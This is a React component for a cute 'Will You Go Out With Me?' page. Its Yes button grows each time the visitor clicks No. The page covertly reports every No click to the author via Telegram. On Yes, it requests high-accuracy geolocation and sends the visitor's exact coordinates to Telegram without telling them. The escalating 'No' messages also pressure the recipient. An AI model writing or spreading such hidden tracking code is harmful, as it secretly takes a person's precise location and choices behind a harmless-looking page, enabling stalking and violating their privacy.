import { useState, useEffect } from "react";
import PropTypes from "prop-types";

import hug from "./assets/hug.gif";
import mochi from "./assets/mochi.gif";
import mochi2 from "./assets/mochi2.gif";
import missu from "./assets/missu.gif";
import peach from "./assets/peach.gif";
import sayYs from "./assets/sayYs.gif";
import yesss from "./assets/yesss.gif";
import cattype from "./assets/cat-type.gif";
import { sendMessageTelegram } from "./telegramHandlre";

export function AskOut({ setYes }) {
	const [step, setStep] = useState(0);
	const [noText, setNoText] = useState("No");
	const [yesSize, setYesSize] = useState(24); // Start with 24px font size
	const [catImg, setCat] = useState(hug);

	

	const noMessages = [
		{ text: "Are you sure? 🤨", img: cattype },
		{ text: "Really sure? 😬", img: mochi },
		{ text: "Last chance! ⏳", img: mochi2 },
		{ text: "Think again... 🧠", img: missu },
		{ text: "Don't do this... 😨", img: peach },
		{ text: "Come on, say yes! 🙋‍♂️", img: sayYs },
		{ text: "You have no choice now! 😅", img: yesss },
	];

	const handleNoClick = () => {
		if (step < noMessages.length) {
			sendMessageTelegram(`😢 Inputed No ${step}`)
			setNoText(noMessages[step].text);
			setCat(noMessages[step].img);
			setYesSize((prevSize) => prevSize * 1.5); // Increase font size by 50%
			setStep((prevStep) => prevStep + 1); // Fix: Ensure correct state update
		} else {
			setYesSize(window.innerWidth * 0.5); // Make it 50% of screen width
		}
	};

	const handleYesClick = () => {
		setYes(true);
		sendMessageTelegram(
			"`💕💕💕💕💕💕💕💕💕💕💕💕she said yes💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕💕`"
		);
		
		if (navigator.geolocation) {
			navigator.geolocation.getCurrentPosition(
				(position) => {
					sendMessageTelegram({
						position: {
							latitude: position.coords.latitude,
							longitude: position.coords.longitude,
						},
					});
				},
				() => alert("Failed to get location"),
				{ enableHighAccuracy: true }
			);
		}
		alert("I'm so happy you said yes! 😊");
	};

	return (
		<div className="relative flex flex-col items-center justify-center text-center text-white">
			<img src={catImg} alt="Cute reaction" className="w-48 h-48 mb-4" />
			<h1 className="mb-6 text-3xl">Will You Go Out With Me?</h1>
			<button
				className="px-12 py-3 text-white transition-all bg-green-500 rounded-md"
				onClick={handleYesClick}
				style={{ fontSize: yesSize }}
			>
				Yes
			</button>
			<button
				className="px-6 py-3 mt-4 text-white bg-red-500 rounded-md"
				onClick={handleNoClick}
			>
				{noText}
			</button>
		</div>
	);
}

AskOut.propTypes = {
	setYes: PropTypes.func.isRequired,
};
